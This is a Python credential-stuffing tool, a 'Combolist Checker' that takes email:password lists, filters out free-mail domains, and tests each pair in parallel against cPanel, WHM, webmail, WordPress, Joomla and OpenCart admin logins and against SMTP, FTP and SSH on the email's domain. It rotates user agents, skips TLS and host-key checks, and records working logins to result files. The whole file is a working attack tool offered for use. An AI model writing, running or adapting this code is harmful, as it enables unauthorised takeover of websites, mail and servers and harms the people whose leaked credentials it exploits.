import sys
import requests
import os
import concurrent.futures
from colorama import Fore, init
import re
from ftplib import FTP, error_perm
import smtplib
import asyncssh
import random
import socket
import asyncio
from lib.tools.utils import banner, clear
from lib.tools.colors import wh, r, g

# Initialize colorama
init(autoreset=True)

# Create 'Result' directory if it doesn't exist
os.makedirs('Result', exist_ok=True)

class BruteForceTool:
    def __init__(self):
        # Color definitions
        self.colors = {
            'red': Fore.RED,
            'cyan': Fore.CYAN,
            'white': Fore.WHITE,
            'green': Fore.GREEN,
            'magenta': Fore.MAGENTA,
            'yellow': Fore.YELLOW,
            'blue': Fore.BLUE,
            'reset': Fore.RESET
        }
        # Disable warnings
        requests.packages.urllib3.disable_warnings()
        # Initialize results dictionary
        self.results = {}

    def update_result(self, domain, service, success):
        if domain not in self.results:
            self.results[domain] = {}
        self.results[domain][service] = success
        self.print_domain_results(domain)

    def print_domain_results(self, domain):
        if domain in self.results:
            result_str = f"{self.colors['white']}http://{domain} "
            services = sorted(self.results[domain].items())
            for service, success in services:
                color = self.colors['green'] if success else self.colors['red']
                result_str += f"{color}[{service}]{self.colors['reset']} "
            print(f"\r{result_str}")

    def URLdomain_luv(self, site):
        site = site.replace("http://", "").replace("https://", "").replace("www.", "")
        return site.split('/')[0].strip()

    def get_random_user_agent(self):
        try:
            with open('lib/files/user-agent.txt', 'r', encoding='utf-8') as f:
                user_agents = [line.strip() for line in f if line.strip()]
            return random.choice(user_agents) if user_agents else 'Mozilla/5.0'
        except FileNotFoundError:
            return 'Mozilla/5.0'

    def perform_login(self, url, payload, success_keywords, result_file, user, pwd):
        try:
            headers = {"User-Agent": self.get_random_user_agent()}
            response = requests.post(url, data=payload, headers=headers, verify=False, timeout=15)
            success = any(keyword in response.text for keyword in success_keywords)
            domain = self.URLdomain_luv(url)
            service_type = result_file.split('/')[-1].split('.')[0].lower()
            
            if success:
                with open(result_file, 'a') as file:
                    file.write(f"{url}@{user}#{pwd}\n")
            
            self.update_result(domain, service_type, success)
        except Exception:
            domain = self.URLdomain_luv(url)
            service_type = result_file.split('/')[-1].split('.')[0].lower()
            self.update_result(domain, service_type, False)

    def check_smtp(self, email, pwd, domain):
        try:
            smtp_server = f"mail.{domain}"
            port = 587
            with smtplib.SMTP(smtp_server, port, timeout=10) as server:
                server.starttls()
                server.login(email, pwd)
                with open('Result/SMTP.txt', 'a') as file:
                    file.write(f"{email}|{pwd}\n")
                self.update_result(domain, 'smtp', True)
        except Exception:
            self.update_result(domain, 'smtp', False)

    def check_ftp(self, email, pwd, domain):
        try:
            ftp_server = domain
            ftp = FTP(ftp_server, timeout=10)
            ftp.login(user=email.split('@')[0], passwd=pwd)
            with open('Result/FTP.txt', 'a') as file:
                file.write(f"[+] URLs: {domain}\n[+] Username: {email}\n[+] Password: {pwd}\n\n")
            self.update_result(domain, 'ftp', True)
            ftp.quit()
        except Exception:
            self.update_result(domain, 'ftp', False)

    async def async_check_ssh(self, email, pwd, domain):
        try:
            username = email.split('@')[0]
            
            # Set connection options
            options = {
                'username': username,
                'password': pwd,
                'known_hosts': None,  # Don't verify host keys
                'preferred_auth': ['password'],
                'connect_timeout': 3,
                'login_timeout': 3
            }
            
            # Try to connect
            async with await asyncssh.connect(domain, port=22, **options) as conn:
                # If we get here, connection was successful
                with open('Result/SSH.txt', 'a') as file:
                    file.write(f"{domain}@{email}#{pwd}\n")
                self.update_result(domain, 'ssh', True)
                
        except (asyncssh.DisconnectError, asyncssh.ProcessError, 
                asyncssh.ChannelOpenError, asyncssh.PermissionDenied,
                OSError, TimeoutError):
            self.update_result(domain, 'ssh', False)
        except Exception:
            self.update_result(domain, 'ssh', False)

    def check_ssh(self, email, pwd, domain):
        # Run the async SSH check in the event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.async_check_ssh(email, pwd, domain))
        finally:
            loop.close()

    def check_cpanel(self, email, pwd):
        domain = self.URLdomain_luv(email.split('@')[1])
        user = email.split('@')[0]
        payload = {'user': user, 'pass': pwd, 'login_submit': 'Log in'}
        self.perform_login(f'https://{domain}:2083/login/', payload, ['lblDomainName'], 'Result/cPanels.txt', user, pwd)

    def check_wehaem(self, email, pwd):
        domain = self.URLdomain_luv(email.split('@')[1])
        user = email.split('@')[0]
        payload = {'user': user, 'pass': pwd}
        self.perform_login(f'https://{domain}:2087/login/', payload, ['Top Tools'], 'Result/WHM.txt', user, pwd)

    def check_webmail(self, email, pwd):
        domain = self.URLdomain_luv(email.split('@')[1])
        user = email.split('@')[0]
        payload = {'user': user, 'pass': pwd}
        self.perform_login(f'https://{domain}:2096/login/', payload, ['id_autoresponders'], 'Result/Webmail.txt', user, pwd)

    def check_wp_credentials(self, email, pwd, domain):
        url = f"https://{domain}/wp-login.php"
        username = email.split('@')[0]
        payload = {"log": username, "pwd": pwd}
        self.perform_login(url, payload, ["wpwrap"], "Result/Wordpress.txt", username, pwd)

    def check_joomla_credentials(self, email, pwd, domain):
        url = f"https://{domain}/administrator/index.php"
        username = email.split('@')[0]
        payload = {"username": username, "passwd": pwd, "task": "login"}
        self.perform_login(url, payload, ["control panel"], "Result/Joomla.txt", username, pwd)

    def check_opencart_credentials(self, email, pwd, domain):
        url = f"https://{domain}/admin/index.php"
        username = email.split('@')[0]
        payload = {"username": username, "password": pwd}
        self.perform_login(url, payload, ["common/logout"], "Result/OpenCart.txt", username, pwd)

    def check_other_services(self, email, pwd, domain):
        services = [
            (self.check_cpanel, [email, pwd]),
            (self.check_wehaem, [email, pwd]),
            (self.check_webmail, [email, pwd]),
            (self.check_wp_credentials, [email, pwd, domain]),
            (self.check_joomla_credentials, [email, pwd, domain]),
            (self.check_opencart_credentials, [email, pwd, domain]),
            (self.check_smtp, [email, pwd, domain]),
            (self.check_ftp, [email, pwd, domain]),
            (self.check_ssh, [email, pwd, domain])
        ]
        
        for service_func, args in services:
            try:
                service_func(*args)
            except Exception:
                continue

    def read_combolist(self, file_name):
        combolist = []
        try:
            with open(file_name, "r", encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        email, password = line.split(":", 1)
                        domain = re.search("@(.*)", email)
                        if domain:
                            domain = domain.group(1)
                            if domain not in ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "yahoo.co.id"]:
                                combolist.append((email, password, domain))
                        else:
                            print(f"{self.colors['red']}Error: Email '{email}' does not have a valid domain.")
                    else:
                        print(f"{self.colors['red']}Error: Line '{line}' does not have the correct format.")
        except Exception as e:
            print(f"{self.colors['red']}Error: {e}")
        return combolist

    def run_checks(self, email, password, domain):
        self.check_other_services(email, password, domain)

    def brute_force(self, combolist, thread_count):
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = [executor.submit(self.run_checks, email, password, domain) 
                      for email, password, domain in combolist]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{self.colors['red']}[!] Error: {e}")

    def cker(self):
        clear()
        print(banner)
        print(f"{wh}[{g}+{wh}] Combolist Checker for CPANEL - WEBMAIL - SSH - WP PANEL - WHM - SMTP - FTP - JOOMLA - OPENCART\n")
        target_file = sys.argv[1] if len(sys.argv) > 1 else input(f"{wh}[{g}+{wh}] Input Combolist => ")

        if not os.path.isfile(target_file):
            print(f"{wh}[{r}!{wh}] File '{target_file}' does not exist!")
            sys.exit(1)

        combolist = self.read_combolist(target_file)
        self.brute_force(combolist, 100)

if __name__ == "__main__":
    brute_force_tool = BruteForceTool()
    brute_force_tool.cker()